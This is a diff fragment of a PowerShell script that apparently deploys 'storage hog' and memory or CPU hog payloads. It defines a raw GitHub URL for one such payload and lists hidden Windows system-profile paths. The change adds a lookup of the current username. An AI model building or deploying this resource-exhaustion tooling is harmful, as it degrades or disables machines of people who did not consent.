@@ -6,6 +6,7 @@ $storageHogUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/hea
 $memPropertyName = "mem"
 $storagePropertyName = "store"
 $cpuPropertyName = "cpu"
+$user = ((Get-CimInstance -ClassName Win32_ComputerSystem).UserName -split '\\')[-1]
 
 $paths =  @(
     "$env:windir\system32\config\systemprofile\AppData\Local",
